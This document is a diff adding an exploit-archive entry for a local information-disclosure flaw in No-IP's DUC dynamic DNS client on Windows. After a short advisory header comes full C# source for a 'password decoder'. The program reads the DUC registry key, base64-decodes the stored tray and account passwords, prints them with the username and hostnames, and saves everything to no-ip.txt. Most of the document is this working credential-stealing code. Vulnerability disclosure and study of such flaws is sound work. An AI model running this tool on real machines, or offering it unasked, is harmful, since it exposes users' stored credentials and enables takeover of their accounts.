@@ -1,0 +1,78 @@
+source: http://www.securityfocus.com/bid/29758/info
+
+The DUC application for No-IP is prone to a local information-disclosure vulnerability when it is running on Microsoft Windows.
+
+Successfully exploiting this issue allows attackers to obtain potentially sensitive information that may aid in further attacks. 
+
+/* 
+* DUC NO-IP Local Password Information Disclosure
+* Author(s): Charalambous Glafkos
+*            George Nicolaou
+* Date: March 11, 2008
+* Site: http://www.astalavista.com
+* Mail: glafkos@astalavista.com
+*       ishtus@astalavista.com
+*
+* Synopsis: DUC NO-IP is prone to an information disclosure vulnerability due to a design error.
+*           Attackers can exploit this issue to obtain sensitive information including tray password,
+*           web username, password and hostnames that may lead to further attacks.
+*            
+* Note: Vendor has been notified long time ago confirming a design error.
+* Vendor site: http://www.no-ip.com
+*           
+*/
+
+using System;
+using System.Text;
+using System.IO;
+using Microsoft.Win32;
+
+namespace getRegistryValue
+{
+   class getValue
+   {
+       static void Main()
+       {
+           getValue details = new getValue();
+           String strDUC = details.getDUC();
+           Console.WriteLine("\nDUC NO-IP Password Decoder v1.2");
+           Console.WriteLine("Author: Charalambous Glafkos");
+           Console.WriteLine("Bugs: glafkos@astalavista.com");
+           Console.WriteLine(strDUC);
+
+           FileInfo t = new FileInfo("no-ip.txt");
+           StreamWriter Tex = t.CreateText();
+           Tex.WriteLine(strDUC);
+           Tex.Write(Tex.NewLine);
+           Tex.Close();
+           Console.WriteLine("\nThe file named no-ip.txt is created\n");
+       }
+
+       private string getDUC()
+       {
+           RegistryKey ducKey = Registry.LocalMachine;
+           ducKey = ducKey.OpenSubKey(@"SOFTWARE\Vitalwerks\DUC", false);
+           String TrayPassword = DecodeBytes(ducKey.GetValue("TrayPassword").ToString());
+           String Username = ducKey.GetValue("Username").ToString();
+           String Password = DecodeBytes(ducKey.GetValue("Password").ToString());
+           String Hostnames = ducKey.GetValue("Hosts").ToString();
+           String strDUC = "\nTrayPassword: " + TrayPassword
+               + "\nUsername: " + Username
+               + "\nPassword: " + Password
+               + "\nHostnames: " + Hostnames;
+           return strDUC;
+       }
+
+       public static string DecodeBytes(String encryptedData) 
+   {
+       Byte[] toDecodeByte = Convert.FromBase64String(encryptedData);
+       System.Text.UTF8Encoding encoder = new System.Text.UTF8Encoding();
+       System.Text.Decoder utf8Decode = encoder.GetDecoder();
+       int charCount = utf8Decode.GetCharCount(toDecodeByte, 0, toDecodeByte.Length);
+       Char[] decodedChar = new char[charCount];
+       utf8Decode.GetChars(toDecodeByte, 0, toDecodeByte.Length, decodedChar, 0);
+       String result = new String(decodedChar);
+       return (new string(decodedChar));
+   }
+ }   
+}
